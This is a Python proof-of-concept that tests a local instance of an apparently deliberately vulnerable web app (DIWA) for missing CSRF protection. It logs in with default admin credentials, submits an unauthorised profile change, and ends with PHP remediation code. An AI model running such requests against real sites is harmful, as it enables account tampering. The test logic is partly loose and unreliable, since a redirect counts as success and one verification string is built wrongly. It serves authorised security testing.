#!/usr/bin/env python3
"""
Stage 2 POC: Missing CSRF (Cross-Site Request Forgery) Protection
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: No CSRF tokens on state-changing forms (edit profile, delete post, etc.)
"""

import requests
import sys
import uuid

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_missing_csrf():
    """
    Simulate CSRF attack: craft HTML that makes authenticated request without token.
    Payload: HTML form that auto-submits to editprofile or create post endpoint
    Expected: Form accepted without CSRF token validation
    """
    print("[*] Testing Missing CSRF Protection...")
    
    try:
        # Login first
        login_payload = {
            'email': 'admin@example.com',
            'password': 'admin'
        }
        resp = SESSION.post(f"{TARGET}/?page=login", data=login_payload)
        
        # Check if we're logged in
        resp_auth = SESSION.get(f"{TARGET}/?page=board")
        if 'board' not in resp_auth.text.lower() and 'thread' not in resp_auth.text.lower():
            print("❌ NOT REPRODUCIBLE: Authentication check failed")
            return False
        
        # Create a request that should require CSRF token
        # Change profile without any CSRF protection
        csrf_payload = {
            'email': f'hacked{str(uuid.uuid4())[:6]}@attacker.com',
            'country': 'AttackerCountry'
            # No CSRF token provided
        }
        
        # Submit as if from attacker's form (same session = authenticated)
        resp_csrf = SESSION.post(
            f"{TARGET}/?page=editprofile",
            data=csrf_payload,
            allow_redirects=False
        )
        
        # Check if form was accepted without CSRF token
        if 'updated' in resp_csrf.text.lower() or 'saved' in resp_csrf.text.lower():
            print("✅ VULNERABLE: Form accepted without CSRF token")
            return True
        
        # Check redirect (usually indicates success)
        if resp_csrf.status_code in [301, 302, 303, 307]:
            print("✅ VULNERABLE: State-changing request accepted without CSRF protection")
            return True
        
        # Verify change was persisted (check user profile page)
        resp_verify = SESSION.get(f"{TARGET}/?page=editprofile")
        if f'hacked{csrf_payload["email"][:6]}' in resp_verify.text or 'AttackerCountry' in resp_verify.text:
            print("✅ VULNERABLE: CSRF attack succeeded - profile was modified")
            return True
        
        print("❌ NOT REPRODUCIBLE: CSRF protection or form validation is in place")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_missing_csrf()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Implement CSRF token validation on all state-changing forms:

  // In session.php or bootstrap.php - generate token on session start
  if (!isset($_SESSION['csrf_token'])) {
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  }
  
  // In forms (HTML)
  <form method="post" action="?page=editprofile">
      <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
      <input type="text" name="email" value="...">
      <button type="submit">Save</button>
  </form>
  
  // In form processing (editprofile.php)
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      // Validate CSRF token
      if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
          http_response_code(403);
          die('CSRF token validation failed');
      }
      
      // Regenerate token after use
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
      
      // Now process the form...
  }

Key points:
- Generate unique token per session: bin2hex(random_bytes(32))
- Include token in ALL forms (hidden input)
- Validate on POST/PUT/DELETE (any state change)
- Regenerate token after use
- Use SameSite=Strict cookie attribute as additional defense
- Apply to: editprofile, editpost, deletepost, upload, createthread, etc.
"""
